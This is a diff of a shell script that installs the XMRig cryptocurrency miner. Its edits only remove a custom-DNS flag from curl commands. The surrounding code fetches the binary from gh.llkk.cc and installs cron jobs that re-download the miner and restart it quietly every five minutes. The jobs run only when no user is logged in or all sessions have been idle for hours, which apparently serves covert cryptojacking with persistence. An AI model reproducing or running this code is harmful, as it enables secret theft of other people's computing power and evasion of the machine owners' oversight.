@@ -97,8 +97,8 @@ download_xmrig() {
         return 1
     fi
     
-    # 使用curl下载，使用自定义DNS服务器和域名解析
-    curl -s -L --dns-servers 8.8.8.8,8.8.4.4 --resolve "gh.llkk.cc:443:104.18.62.129" "$DOWNLOAD_URL" -o "$filepath"
+    # 使用curl下载，直接指定域名解析到IP
+    curl -s -L --resolve "gh.llkk.cc:443:104.18.62.129" "$DOWNLOAD_URL" -o "$filepath"
     
     if [ $? -eq 0 ] && [ -f "$filepath" ]; then
         chmod +x "$filepath"
@@ -208,7 +208,7 @@ setup_crontab() {
     local user_check_logic="users=\\\$(who | wc -l); if [ \\\$users -eq 0 ]; then can_exec=1; else can_exec=1; while IFS= read -r line; do if [ -n \"\\\$line\" ]; then idle=\\\$(echo \"\\\$line\" | awk '{print \\\$4}'); if [[ \"\\\$idle\" == \".\" ]]; then can_exec=0; break; elif [[ \"\\\$idle\" =~ ^[0-9]{2}:[0-9]{2}\\\$ ]]; then hours=\\\$(echo \"\\\$idle\" | cut -d: -f1); hours=\\\$((10#\\\$hours)); if [ \\\$hours -lt 5 ]; then can_exec=0; break; fi; elif [[ \"\\\$idle\" != \"old\" ]]; then can_exec=0; break; fi; fi; done < <(who); fi"
     
     # 构建定时任务命令 - 任务1：文件检查和下载（每5分钟）
-    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L --dns-servers 8.8.8.8,8.8.4.4 --resolve \"gh.llkk.cc:443:104.18.62.129\" \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
+    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L --resolve \"gh.llkk.cc:443:104.18.62.129\" \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
     
     # 构建定时任务命令 - 任务2：进程监控和重启（每5分钟）
     local process_monitor_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
